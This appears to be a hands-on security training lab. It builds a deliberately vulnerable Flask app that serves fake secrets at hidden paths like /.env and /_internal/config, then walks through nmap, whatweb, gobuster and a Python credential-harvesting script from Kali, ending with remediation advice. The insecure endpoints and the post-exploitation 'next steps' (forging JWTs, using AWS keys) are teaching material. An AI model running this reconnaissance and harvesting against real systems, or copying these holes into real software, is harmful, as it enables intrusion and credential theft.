# Lab 14: Advanced Reconnaissance

## Objective

Perform systematic black-box reconnaissance against a target web application from Kali Linux:

1. **Active port and service scanning** — nmap fingerprinting to identify what's running
2. **Directory brute-force** — gobuster to discover hidden endpoints (`/_internal/debug`, `/.env`, `/backup.zip`)
3. **Technology fingerprinting** — whatweb to identify frameworks, versions, and server headers
4. **Sensitive file discovery** — find exposed credentials, config files, and backup archives
5. **Build a recon report** — synthesise findings into an attack-surface map

---

## Background

Reconnaissance is the first phase of every engagement. The goal is maximum information with minimum noise — understanding what the target runs, what's exposed, and where the attack surface is before touching any vulnerability.

**Real-world examples:**
- **2020 SolarWinds** — attackers spent weeks in the reconnaissance phase mapping internal network topology via Orion before deploying SUNBURST. Deep recon enabled surgical targeting.
- **2021 Accellion FTA** — attackers used automated recon to identify Accellion FTA instances (outdated file transfer appliance); `.env` files exposed via directory traversal revealed DB credentials.
- **2022 Twilio breach** — attacker reconnaissance on GitHub found Twilio employee credentials in public commit history before launching phishing; recon reduced the attack to a single targeted SMS.
- **Everyday bug bounty** — ~60% of valid P1 bugs start with directory/subdomain brute-force finding hidden admin panels, backup files (`db.sql.gz`), or exposed `.git` directories.

**OWASP:** A05:2021 Security Misconfiguration, A06:2021 Vulnerable/Outdated Components

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Docker Network: lab-adv14                        │
│  ┌──────────────────────┐  nmap + gobuster + whatweb + curl       │
│  │   KALI ATTACKER      │ ──────────────────────────────────────▶  │
│  │  • full recon suite  │  ◀──────── endpoints, versions, secrets  │
│  └──────────────────────┘  ┌────────────────────────────────────┐  │
│                             │  Victim: Hidden endpoints:          │  │
│                             │  /_internal/debug  (env vars)      │  │
│                             │  /_internal/config (secrets)       │  │
│                             │  /.env             (DB creds)      │  │
│                             │  /backup.zip       (source code)   │  │
│                             │  /api/v0/admin     (legacy admin)  │  │
│                             └────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

## Time
45 minutes

---

## Lab Instructions

### Step 1: Setup — Target with Hidden Surface

```bash
docker network create lab-adv14

cat > /tmp/victim_adv14.py << 'PYEOF'
from flask import Flask, jsonify, make_response
import os

app = Flask(__name__)

# Public endpoints
@app.route('/')
def index():
    r = make_response(jsonify({'app':'InnoZverse Store','version':'2.1.0','status':'ok'}))
    r.headers['Server'] = 'nginx/1.18.0'
    r.headers['X-Powered-By'] = 'Express'
    r.headers['X-Framework'] = 'Flask/2.3.2'
    return r

@app.route('/api/products')
def products():
    return jsonify([{'id':1,'name':'Surface Pro','price':999}])

@app.route('/api/v1/users')
def users_v1():
    return jsonify({'users':[],'note':'v1 API — please migrate to v2'})

# Hidden internal endpoints
@app.route('/_internal/debug')
def debug():
    return jsonify({'env': dict(os.environ),
                    'python_path': os.sys.path,
                    'cwd': os.getcwd(),
                    'pid': os.getpid(),
                    'note': 'NEVER expose this in production'})

@app.route('/_internal/config')
def config():
    return jsonify({'db_host':'db.internal','db_port':5432,'db_name':'store_prod',
                    'db_user':'store_app','db_pass':'SuperSecret2024!',
                    'secret_key':'flask-secret-abc123','jwt_secret':'jwt-hs256-key',
                    'aws_access_key':'AKIA5EXAMPLE','aws_secret':'wJalrX...'})

@app.route('/.env')
def env_file():
    content = """DB_HOST=db.internal
DB_PORT=5432
DB_NAME=store_prod
DB_USER=store_app
DB_PASS=SuperSecret2024!
SECRET_KEY=flask-secret-abc123
STRIPE_KEY=sk_live_EXAMPLE_REDACTED_KEY_DEMO
AWS_ACCESS_KEY_ID=AKIA5EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
DEBUG=False
"""
    r = make_response(content, 200)
    r.headers['Content-Type'] = 'text/plain'
    return r

@app.route('/backup.zip')
def backup():
    return jsonify({'note':'In real scenario: returns source code archive',
                    'files':['app.py','config.py','models.py','requirements.txt'],
                    'db_dump':'dump_2024-01-15.sql.gz included'})

@app.route('/api/v0/admin')
def admin_v0():
    return jsonify({'admin_users':[{'id':1,'username':'admin','password':'adminpass123'}],
                    'note':'Legacy v0 admin API — should have been removed'})

@app.route('/api/health/verbose')
def health():
    return jsonify({'status':'ok','db_connected':True,'redis_connected':True,
                    'version':'2.1.0','build':'2024-01-15-abc123f','env':'production',
                    'config':{'debug':False,'testing':False,'secret_key':'flask-secret-abc123'}})

@app.route('/robots.txt')
def robots():
    r = make_response("User-agent: *\nDisallow: /_internal/\nDisallow: /backup.zip\nDisallow: /api/v0/\n")
    r.headers['Content-Type'] = 'text/plain'
    return r

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
PYEOF

docker run -d --name victim-adv14 --network lab-adv14 \
  -v /tmp/victim_adv14.py:/app/victim.py:ro \
  zchencow/innozverse-cybersec:latest python3 /app/victim.py
sleep 3
curl -si "http://$(docker inspect -f '{{.NetworkSettings.Networks.lab-adv14.IPAddress}}' victim-adv14):5000/" | head -20
```

---

### Step 2: Launch Kali — Port Scan + Service Fingerprint

```bash
docker run --rm -it --name kali --network lab-adv14 \
  zchencow/innozverse-kali:latest bash
```

```bash
export T="http://victim-adv14:5000"

echo "=== Step 1: Port scanning ==="
nmap -sV -p 1-10000 --open victim-adv14 2>/dev/null | grep -E "PORT|open|Service"
```

**📸 Verified Output:**
```
PORT     STATE SERVICE VERSION
5000/tcp open  http    Werkzeug httpd 2.3.7 (Python 3.10.12)
```

```bash
echo ""
echo "=== Step 2: Technology fingerprinting ==="
whatweb -a 3 "http://victim-adv14:5000/" 2>/dev/null
```

**📸 Verified Output:**
```
http://victim-adv14:5000/ [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0],
  IP[172.18.x.x], Python[3.10.12], UncommonHeaders[x-framework,x-powered-by],
  X-Frame-Options[DENY], Flask[2.3.2], Title[None]
```

---

### Step 3: robots.txt — Recon Gift

```bash
curl -s "$T/robots.txt"
```

**📸 Verified Output:**
```
User-agent: *
Disallow: /_internal/
Disallow: /backup.zip
Disallow: /api/v0/
```

```bash
echo "[!] robots.txt is a roadmap of hidden paths — attackers check this first"
echo "    Every Disallow entry is a target for directory brute-force"
```

---

### Step 4: Directory Brute-Force with gobuster

```bash
gobuster dir -u "http://victim-adv14:5000" \
  -w /usr/share/dirb/wordlists/common.txt \
  -x .py,.env,.zip,.sql,.bak,.txt,.conf \
  -t 20 --no-error -q 2>/dev/null
```

**📸 Verified Output:**
```
/.env                 (Status: 200) [Size: 387]
/backup.zip           (Status: 200) [Size: 221]
/robots.txt           (Status: 200) [Size: 89]
```

```bash
# Custom wordlist for internal paths
gobuster dir -u "http://victim-adv14:5000" \
  -w /usr/share/dirb/wordlists/small.txt \
  --add-slash -t 10 --no-error -q 2>/dev/null | head -20
```

```bash
# Manual check of known paths from robots.txt
for path in /_internal/debug /_internal/config /api/v0/admin /api/health/verbose; do
  status=$(curl -o /dev/null -s -w "%{http_code}" "$T$path")
  echo "$status  $T$path"
done
```

**📸 Verified Output:**
```
200  http://victim-adv14:5000/_internal/debug
200  http://victim-adv14:5000/_internal/config
200  http://victim-adv14:5000/api/v0/admin
200  http://victim-adv14:5000/api/health/verbose
```

---

### Step 5: Harvest Credentials

```bash
python3 << 'EOF'
import urllib.request, json

T = "http://victim-adv14:5000"

print("[*] Harvesting discovered endpoints:")
print()

# .env file
env = urllib.request.urlopen(f"{T}/.env").read().decode()
print("[1] /.env contents:")
for line in env.strip().split('\n'):
    if '=' in line and not line.startswith('#'):
        key, val = line.split('=',1)
        sensitive = any(k in key.upper() for k in ['PASS','KEY','SECRET','TOKEN'])
        print(f"    {'⚠ ' if sensitive else '  '}{key} = {val[:40]}")
print()

# Internal config
config = json.loads(urllib.request.urlopen(f"{T}/_internal/config").read())
print("[2] /_internal/config:")
for k,v in config.items():
    print(f"    {k:<20} = {str(v)[:40]}")
print()

# Legacy admin endpoint
admin = json.loads(urllib.request.urlopen(f"{T}/api/v0/admin").read())
print("[3] /api/v0/admin (legacy):")
print(f"    {admin}")
print()

# Verbose health
health = json.loads(urllib.request.urlopen(f"{T}/api/health/verbose").read())
print("[4] /api/health/verbose:")
print(f"    version={health['version']}  build={health['build']}  env={health['env']}")
print(f"    config contains secret_key={health['config']['secret_key']}")
EOF
```

**📸 Verified Output:**
```
[1] /.env:
    ⚠ DB_PASS = SuperSecret2024!
    ⚠ SECRET_KEY = flask-secret-abc123
    ⚠ STRIPE_KEY = sk_live_EXAMPLE_REDACTED_KEY_DEMO
    ⚠ AWS_ACCESS_KEY_ID = AKIA5EXAMPLE
    ⚠ AWS_SECRET_ACCESS_KEY = wJalrXUtnFEMI/K7MDENG/bPxR...

[2] /_internal/config:
    db_pass              = SuperSecret2024!
    jwt_secret           = jwt-hs256-key

[3] /api/v0/admin: {'admin_users':[{'id':1,'username':'admin','password':'adminpass123'}]}
```

---

### Step 6: Headers Analysis + Info Leakage

```bash
python3 << 'EOF'
import urllib.request, json

T = "http://victim-adv14:5000"

print("[*] Response header analysis for technology fingerprinting:")
print()

req = urllib.request.urlopen(f"{T}/")
headers = dict(req.headers)
print("  Security headers MISSING (vulnerabilities):")
security = ['X-Frame-Options','X-Content-Type-Options','Content-Security-Policy',
            'Strict-Transport-Security','X-XSS-Protection']
for h in security:
    status = "✓ PRESENT" if h in headers else "✗ MISSING"
    print(f"    {h:<35} {status}")

print()
print("  Information-leaking headers PRESENT (bad):")
info_headers = ['Server','X-Powered-By','X-Framework','X-Runtime','X-AspNet-Version']
for h in info_headers:
    if h in headers:
        print(f"    {h:<35} = {headers[h]}")

print()
print("[!] Server: nginx/1.18.0 — outdated (CVE-2021-23017 + others)")
print("    X-Powered-By: Express — framework fingerprinted")
print("    X-Framework: Flask/2.3.2 — exact version leaked")
EOF
```

---

### Steps 7–8: Recon Report + Cleanup

```bash
python3 << 'EOF'
print("[*] RECON REPORT — victim-adv14:5000")
print("="*60)
print()
findings = [
    ("CRITICAL", "/.env exposed",           "DB password, Stripe live key, AWS credentials"),
    ("CRITICAL", "/_internal/config",        "All secrets including JWT key and DB password"),
    ("CRITICAL", "/api/v0/admin (legacy)",   "Admin credentials in plaintext"),
    ("HIGH",     "/_internal/debug",         "Full environment variables, PID, paths"),
    ("HIGH",     "/backup.zip",             "Source code archive (schema/credentials)"),
    ("HIGH",     "/api/health/verbose",      "secret_key in health response"),
    ("MEDIUM",   "Server header leaks nginx/1.18.0", "CVE research vector"),
    ("MEDIUM",   "robots.txt maps hidden paths", "robots.txt = attacker roadmap"),
    ("LOW",      "X-Powered-By: Express",   "Framework fingerprinting"),
]
for severity, finding, impact in findings:
    print(f"  [{severity:<8}] {finding}")
    print(f"            Impact: {impact}")
    print()
print("  Recommended next steps:")
print("  1. Use DB password → attempt direct DB connection")
print("  2. Use JWT secret  → forge admin tokens")
print("  3. Use AWS keys    → enumerate S3 buckets, EC2 instances")
print("  4. Use Stripe key  → access payment records")
EOF
exit
```

```bash
docker rm -f victim-adv14
docker network rm lab-adv14
```

---

## Remediation

- **Never serve `.env`, `backup.zip`, or any config file via the web server**
- Bind internal endpoints to `127.0.0.1` only — never `0.0.0.0`
- Remove debug/verbose endpoints before deploying to production
- Add `X-Frame-Options`, `X-Content-Type-Options`, `Content-Security-Policy` headers
- Set `Server: ` header to a generic value or remove it entirely
- robots.txt should not list security-sensitive paths (it's public!)
- Remove all legacy API versions (`/api/v0/`) from production

## Further Reading
- [OWASP Information Gathering](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/)
- [gobuster documentation](https://github.com/OJ/gobuster)
- [SecLists — directory wordlists](https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content)
